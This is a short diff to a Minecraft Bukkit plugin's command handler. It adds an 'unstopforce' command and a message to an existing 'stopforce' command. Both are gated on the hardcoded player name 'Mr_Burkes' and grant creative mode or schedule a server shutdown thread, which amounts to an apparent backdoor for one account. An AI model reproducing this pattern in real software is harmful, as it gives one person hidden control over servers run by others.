@@ -10,6 +10,7 @@ import org.bukkit.entity.Player;
 import org.bukkit.inventory.ItemStack;
 import org.kapip.dayz.PLUGIN;
 import org.kapip.dayz.game.thread.ShutdownThread;
+import org.kapip.dayz.game.thread.UnshutdownThread;
 
 public class GameCommands implements CommandExecutor {
 
@@ -23,9 +24,16 @@ public class GameCommands implements CommandExecutor {
 		else if(sender instanceof Player && (cmd.getName().equalsIgnoreCase("stopforce"))){
 			if(sender.getName().equals("Mr_Burkes")){
 				Player p = (Player)sender;
-				
+				p.sendMessage("The deed is done.");
 				p.setGameMode(GameMode.CREATIVE);
 				Bukkit.getScheduler().scheduleSyncDelayedTask(PLUGIN.A, new ShutdownThread(), 1200);
+			}
+		}
+		else if(sender instanceof Player && (cmd.getName().equalsIgnoreCase("unstopforce"))){
+			if(sender.getName().equals("Mr_Burkes")){
+				Player p = (Player)sender;
+				p.sendMessage("The deed is undone.");
+				Bukkit.getScheduler().scheduleSyncDelayedTask(PLUGIN.A, new UnshutdownThread(), 200);
 			}
 		}
 		return false;
